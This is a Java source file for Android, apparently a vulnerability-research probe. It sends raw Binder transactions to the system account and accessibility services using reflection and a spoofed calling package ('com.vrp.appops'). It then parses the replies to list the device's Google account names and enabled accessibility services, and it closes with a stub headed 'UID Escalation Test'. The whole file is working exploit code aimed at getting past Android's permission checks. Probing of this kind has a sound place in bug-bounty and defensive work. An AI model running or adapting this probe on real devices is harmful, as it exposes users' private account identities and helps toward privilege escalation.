import android.os.IBinder;
import android.os.Parcel;
import java.lang.reflect.Method;

public class DataParse {
    public static void main(String[] args) throws Exception {
        Class<?> sm = Class.forName("android.os.ServiceManager");
        Method gs = sm.getMethod("getService", String.class);
        System.out.println("UID: " + android.os.Process.myUid());

        // Parse Account service txn3
        System.out.println("\n=== Account Service txn3 ===");
        IBinder acct = (IBinder) gs.invoke(null, "account");
        if (acct != null) {
            Parcel d = Parcel.obtain();
            Parcel r = Parcel.obtain();
            d.writeInterfaceToken("android.accounts.IAccountManager");
            acct.transact(3, d, r, 0);
            r.setDataPosition(0);
            r.readException();
            int avail = r.dataAvail();
            System.out.println("  Available: " + avail + " bytes");

            // Try reading as Account[] array
            try {
                int count = r.readInt();
                System.out.println("  Array size: " + count);
                for (int i = 0; i < count && i < 20; i++) {
                    // Account is Parcelable: name (String), type (String)
                    int present = r.readInt(); // 1 if present
                    if (present != 0) {
                        String name = r.readString();
                        String type = r.readString();
                        System.out.println("  ACCOUNT[" + i + "]: name=" + name + " type=" + type);
                    }
                }
            } catch (Exception e) {
                System.out.println("  Parse error: " + e.getMessage());
            }
            d.recycle();
            r.recycle();

            // Try getAccounts with "com.google" type
            System.out.println("\n  --- getAccounts('com.google') ---");
            for (int txn = 3; txn <= 7; txn++) {
                d = Parcel.obtain();
                r = Parcel.obtain();
                try {
                    d.writeInterfaceToken("android.accounts.IAccountManager");
                    d.writeString("com.google"); // account type
                    d.writeString("com.vrp.appops"); // calling package
                    acct.transact(txn, d, r, 0);
                    r.setDataPosition(0);
                    r.readException();
                    avail = r.dataAvail();
                    if (avail > 4) {
                        System.out.println("  txn" + txn + ": " + avail + " bytes");
                        try {
                            int count = r.readInt();
                            System.out.println("    count=" + count);
                            for (int i = 0; i < count && i < 10; i++) {
                                int present = r.readInt();
                                if (present != 0) {
                                    String name = r.readString();
                                    String type = r.readString();
                                    System.out.println("    ACCOUNT: name=" + name + " type=" + type);
                                }
                            }
                        } catch (Exception pe) {
                            System.out.println("    parse: " + pe.getMessage());
                        }
                    }
                } catch (Exception e) {
                    String m = e.getMessage();
                    if (m != null && m.length() > 100) m = m.substring(0, 100);
                    System.out.println("  txn" + txn + ": " + e.getClass().getSimpleName() + " " + m);
                } finally {
                    d.recycle();
                    r.recycle();
                }
            }
        }

        // Parse Accessibility service txn5
        System.out.println("\n=== Accessibility Service txn5 ===");
        IBinder a11y = (IBinder) gs.invoke(null, "accessibility");
        if (a11y != null) {
            String iface = a11y.getInterfaceDescriptor();
            Parcel d = Parcel.obtain();
            Parcel r = Parcel.obtain();
            d.writeInterfaceToken(iface);
            a11y.transact(5, d, r, 0);
            r.setDataPosition(0);
            r.readException();
            int avail = r.dataAvail();
            System.out.println("  Available: " + avail + " bytes");

            // Try reading as List<AccessibilityServiceInfo>
            try {
                int count = r.readInt();
                System.out.println("  Service count: " + count);
                // Read raw data to extract strings
                r.setDataPosition(r.dataPosition());
                byte[] raw = new byte[Math.min(avail - 4, 4096)];
                r.readByteArray(raw);
                // Extract UTF-16LE strings
                StringBuilder sb = new StringBuilder();
                java.util.ArrayList<String> strings = new java.util.ArrayList<>();
                for (int i = 0; i < raw.length - 1; i += 2) {
                    char c = (char)((raw[i] & 0xff) | ((raw[i+1] & 0xff) << 8));
                    if (c >= 32 && c < 127) {
                        sb.append(c);
                    } else if (sb.length() > 4) {
                        strings.add(sb.toString());
                        sb.setLength(0);
                    } else {
                        sb.setLength(0);
                    }
                }
                if (sb.length() > 4) strings.add(sb.toString());
                System.out.println("  Extracted " + strings.size() + " strings:");
                for (String s : strings) {
                    if (s.contains(".") || s.contains("/") || s.contains("Service") || s.contains("accessibility")) {
                        System.out.println("    " + s);
                    }
                }
            } catch (Exception e) {
                System.out.println("  Parse error: " + e.getMessage());
            }
            d.recycle();
            r.recycle();
        }

        // Now test: can we use run-as to execute from app UID?
        System.out.println("\n=== UID Escalation Test ===");
        System.out.println("  Current UID: " + android.os.Process.myUid());
    }
}
